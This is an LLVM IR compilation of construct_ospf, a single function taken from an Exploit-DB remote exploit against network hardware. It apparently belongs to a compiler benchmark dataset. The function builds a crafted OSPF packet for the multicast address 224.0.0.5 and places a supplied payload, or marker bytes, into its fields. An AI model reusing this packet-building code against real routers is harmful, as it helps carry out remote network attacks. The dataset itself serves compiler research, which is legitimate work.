; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_22271.c_construct_ospf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_22271.c_construct_ospf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_12__ = type { i32, i32, i32, i32, i32 }
%struct.in_addr = type { i32 }
%struct.TYPE_11__ = type { i32, i32, %struct.TYPE_8__, %struct.TYPE_7__, i32, i32, i8* }
%struct.TYPE_8__ = type { i32* }
%struct.TYPE_7__ = type { i32* }
%struct.TYPE_10__ = type { i32, i32, i32*, i32*, i32, i8* }
%struct.TYPE_9__ = type { i32*, i32, i32, i32*, i32*, i8* }

@__const.construct_ospf.all_ospf = private unnamed_addr constant [10 x i8] c"224.0.0.5\00", align 1
@IPTTL = common dso_local global i32 0, align 4
@IPPROTO_OSPF = common dso_local global i32 0, align 4
@IP_ADDR_LEN = common dso_local global i32 0, align 4
@cfg = common dso_local global %struct.TYPE_12__ zeroinitializer, align 4
@pc = common dso_local global i32 0, align 4
@payloadc = common dso_local global i32 0, align 4
@payload = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [11 x i8] c" [0x%08X] \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32* @construct_ospf(%struct.in_addr* %0, %struct.in_addr* %1, i32 %2, i32* %3) #0 {
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.in_addr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca %struct.TYPE_11__*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [10 x i8], align 1
  %13 = alloca %struct.TYPE_10__*, align 8
  %14 = alloca %struct.TYPE_9__*, align 8
  store %struct.in_addr* %0, %struct.in_addr** %5, align 8
  store %struct.in_addr* %1, %struct.in_addr** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32* %3, i32** %8, align 8
  %15 = bitcast [10 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([10 x i8], [10 x i8]* @__const.construct_ospf.all_ospf, i32 0, i32 0), i64 10, i1 false)
  %16 = load i32*, i32** %8, align 8
  store i32 120, i32* %16, align 4
  %17 = load i32*, i32** %8, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 3
  %20 = call i64 @smalloc(i32 %19)
  %21 = inttoptr i64 %20 to i32*
  store i32* %21, i32** %9, align 8
  %22 = load i32*, i32** %9, align 8
  %23 = bitcast i32* %22 to %struct.TYPE_11__*
  store %struct.TYPE_11__* %23, %struct.TYPE_11__** %10, align 8
  %24 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %25 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %24, i32 0, i32 0
  store i32 4, i32* %25, align 8
  %26 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %27 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %26, i32 0, i32 1
  store i32 10, i32* %27, align 4
  %28 = load i32*, i32** %8, align 8
  %29 = load i32, i32* %28, align 4
  %30 = call i8* @htons(i32 %29)
  %31 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %32 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %31, i32 0, i32 6
  store i8* %30, i8** %32, align 8
  %33 = load i32, i32* @IPTTL, align 4
  %34 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %35 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %34, i32 0, i32 5
  store i32 %33, i32* %35, align 4
  %36 = load i32, i32* @IPPROTO_OSPF, align 4
  %37 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %38 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %37, i32 0, i32 4
  store i32 %36, i32* %38, align 8
  %39 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %40 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %39, i32 0, i32 3
  %41 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %40, i32 0, i32 0
  %42 = load %struct.in_addr*, %struct.in_addr** %6, align 8
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  %44 = load i32, i32* @IP_ADDR_LEN, align 4
  %45 = call i32 @memcpy(i32** %41, i32* %43, i32 %44)
  %46 = load i32, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 4), align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %54, label %48

48:                                               ; preds = %4
  %49 = getelementptr inbounds [10 x i8], [10 x i8]* %12, i64 0, i64 0
  %50 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %51 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %50, i32 0, i32 2
  %52 = bitcast %struct.TYPE_8__* %51 to %struct.in_addr*
  %53 = call i32 @inet_aton(i8* %49, %struct.in_addr* %52)
  br label %62

54:                                               ; preds = %4
  %55 = load %struct.TYPE_11__*, %struct.TYPE_11__** %10, align 8
  %56 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %55, i32 0, i32 2
  %57 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %56, i32 0, i32 0
  %58 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %59 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %58, i32 0, i32 0
  %60 = load i32, i32* @IP_ADDR_LEN, align 4
  %61 = call i32 @memcpy(i32** %57, i32* %59, i32 %60)
  br label %62

62:                                               ; preds = %54, %48
  %63 = load i32*, i32** %9, align 8
  %64 = bitcast i32* %63 to i8*
  %65 = getelementptr i8, i8* %64, i64 40
  %66 = bitcast i8* %65 to %struct.TYPE_10__*
  store %struct.TYPE_10__* %66, %struct.TYPE_10__** %13, align 8
  %67 = load i32*, i32** %9, align 8
  %68 = bitcast i32* %67 to i8*
  %69 = getelementptr i8, i8* %68, i64 40
  %70 = getelementptr i8, i8* %69, i64 40
  %71 = bitcast i8* %70 to %struct.TYPE_9__*
  store %struct.TYPE_9__* %71, %struct.TYPE_9__** %14, align 8
  %72 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %73 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %72, i32 0, i32 0
  store i32 2, i32* %73, align 8
  %74 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %75 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %74, i32 0, i32 1
  store i32 1, i32* %75, align 4
  %76 = call i8* @htons(i32 80)
  %77 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %78 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %77, i32 0, i32 5
  store i8* %76, i8** %78, align 8
  %79 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %80 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %79, i32 0, i32 2
  %81 = call i32 @memcpy(i32** %80, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 3), i32 4)
  %82 = load i32, i32* @pc, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* @pc, align 4
  %84 = load i32, i32* @pc, align 4
  %85 = load i32, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 0), align 4
  %86 = icmp sle i32 %84, %85
  br i1 %86, label %87, label %102

87:                                               ; preds = %62
  %88 = load i32, i32* @pc, align 4
  %89 = load i32, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 0), align 4
  %90 = load i32, i32* @payloadc, align 4
  %91 = sdiv i32 %90, 4
  %92 = sub nsw i32 %89, %91
  %93 = icmp sgt i32 %88, %92
  br i1 %93, label %94, label %102

94:                                               ; preds = %87
  %95 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %96 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %95, i32 0, i32 3
  %97 = load i32*, i32** @payload, align 8
  %98 = load i32, i32* @IP_ADDR_LEN, align 4
  %99 = call i32 @memcpy(i32** %96, i32* %97, i32 %98)
  %100 = load i32*, i32** @payload, align 8
  %101 = getelementptr inbounds i32, i32* %100, i64 -4
  store i32* %101, i32** @payload, align 8
  br label %119

102:                                              ; preds = %87, %62
  %103 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %104 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %103, i32 0, i32 3
  %105 = load i32*, i32** %104, align 8
  %106 = getelementptr inbounds i32, i32* %105, i64 0
  store i32 202, i32* %106, align 4
  %107 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %108 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %107, i32 0, i32 3
  %109 = load i32*, i32** %108, align 8
  %110 = getelementptr inbounds i32, i32* %109, i64 1
  store i32 254, i32* %110, align 4
  %111 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %112 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %111, i32 0, i32 3
  %113 = load i32*, i32** %112, align 8
  %114 = getelementptr inbounds i32, i32* %113, i64 2
  store i32 186, i32* %114, align 4
  %115 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %116 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %115, i32 0, i32 3
  %117 = load i32*, i32** %116, align 8
  %118 = getelementptr inbounds i32, i32* %117, i64 3
  store i32 190, i32* %118, align 4
  br label %119

119:                                              ; preds = %102, %94
  %120 = load i32, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 1), align 4
  %121 = icmp sgt i32 %120, 2
  br i1 %121, label %122, label %129

122:                                              ; preds = %119
  %123 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %124 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %123, i32 0, i32 3
  %125 = bitcast i32** %124 to i32*
  %126 = load i32, i32* %125, align 8
  %127 = call i32 @ntohl(i32 %126)
  %128 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i32 %127)
  br label %129

129:                                              ; preds = %122, %119
  %130 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %131 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %130, i32 0, i32 0
  %132 = call i32 @memcpy(i32** %131, i32* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @cfg, i32 0, i32 2), i32 4)
  %133 = call i8* @htons(i32 10)
  %134 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %135 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %134, i32 0, i32 5
  store i8* %133, i8** %135, align 8
  %136 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %137 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %136, i32 0, i32 1
  store i32 2, i32* %137, align 8
  %138 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %139 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %138, i32 0, i32 2
  store i32 2, i32* %139, align 4
  %140 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %141 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %140, i32 0, i32 3
  %142 = load i32*, i32** %141, align 8
  %143 = getelementptr inbounds i32, i32* %142, i64 3
  store i32 40, i32* %143, align 4
  %144 = load %struct.TYPE_9__*, %struct.TYPE_9__** %14, align 8
  %145 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %144, i32 0, i32 4
  %146 = load %struct.in_addr*, %struct.in_addr** %6, align 8
  %147 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %146, i32 0, i32 0
  %148 = load i32, i32* @IP_ADDR_LEN, align 4
  %149 = call i32 @memcpy(i32** %145, i32* %147, i32 %148)
  %150 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %151 = bitcast %struct.TYPE_10__* %150 to i32*
  %152 = call i32 @chksum(i32* %151, i32 80)
  store i32 %152, i32* %11, align 4
  %153 = load i32, i32* %11, align 4
  %154 = load %struct.TYPE_10__*, %struct.TYPE_10__** %13, align 8
  %155 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %154, i32 0, i32 4
  store i32 %153, i32* %155, align 8
  %156 = load i32*, i32** %9, align 8
  ret i32* %156
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @smalloc(i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @memcpy(i32**, i32*, i32) #2

declare dso_local i32 @inet_aton(i8*, %struct.in_addr*) #2

declare dso_local i32 @printf(i8*, i32) #2

declare dso_local i32 @ntohl(i32) #2

declare dso_local i32 @chksum(i32*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
